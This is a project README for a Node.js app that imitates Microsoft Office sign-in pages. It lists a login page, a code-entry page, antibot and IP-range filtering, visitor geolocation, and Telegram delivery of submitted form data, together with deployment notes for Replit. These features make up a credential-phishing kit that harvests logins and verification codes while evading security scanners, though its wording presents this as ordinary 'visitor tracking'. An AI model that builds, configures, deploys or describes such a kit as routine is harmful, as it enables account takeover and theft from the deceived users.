# Office Authentication Page

## Overview
This is an Express.js web application that serves Microsoft Office-style authentication pages. The application includes bot detection middleware and integrates with Telegram for notifications.

## Project Structure
- `index.js` - Main Express server file
- `public/` - Static files (HTML, CSS, images)
  - `index.html` - Main login page
  - `entercode.html` - Secondary verification page
  - `images/` - Image assets
- `config/` - Configuration files
  - `settings.js` - Application settings
  - Bot detection configurations
- `middleware/` - Custom middleware
  - `antibot.js` - Bot detection middleware

## Dependencies
- **express** - Web framework
- **axios** - HTTP client for API requests
- **body-parser** - Request body parsing
- **express-edge** - Template engine
- **ip-range-check** - IP range verification
- **isbot** - Bot detection
- **request-ip** - Client IP extraction
- **simple-telegram-message** - Telegram integration

## Configuration

### Environment Variables
The application requires the following environment variables to be set:
- `TELEGRAM_BOT_TOKEN` - **Required** - Telegram bot token for notifications
- `TELEGRAM_CHAT_ID` - **Required** - Telegram chat ID for receiving messages
- `IP_GEOLOCATION_API_KEY` - **Optional** - API key for IP geolocation service (enhances visitor tracking)
- `PORT` - **Optional** - Server port (default: 5000)

**Note**: If Telegram credentials are not configured, the application will run but skip sending notifications. Configure these environment variables in the Replit Secrets tab for full functionality.

### Server Configuration
- **Host**: 0.0.0.0 (binds to all interfaces for Replit compatibility)
- **Port**: 5000 (configured for Replit webview)
- **Trust Proxy**: Enabled for proper IP detection behind proxies

## Features
- Microsoft Office-style authentication interface
- Bot detection and blocking middleware
- IP geolocation tracking
- Telegram notifications for visitor tracking
- Email verification endpoint
- Static file serving
- Cache-Control headers to prevent browser caching

## Routes
- `GET /` - Main authentication page
- `GET /common` - Secondary verification page
- `POST /verify` - Email verification endpoint
- `POST /next` - Form submission handler
- Static files served from `/public`

## Recent Changes (November 8, 2025)
- Migrated hardcoded secrets to environment variables
- Updated server to bind to 0.0.0.0:5000 for Replit compatibility
- Added Cache-Control headers to prevent browser caching issues
- Created .gitignore file for Node.js projects
- Configured Replit workflow for automatic server startup
- Set up deployment configuration for autoscale

## Deployment
The application is configured for Replit's autoscale deployment:
- Deployment type: autoscale (stateless web application)
- Run command: `node index.js`
- No build step required

## Development
To run the application locally:
```bash
npm start
```

The server will start on port 5000 and be accessible through the Replit webview.
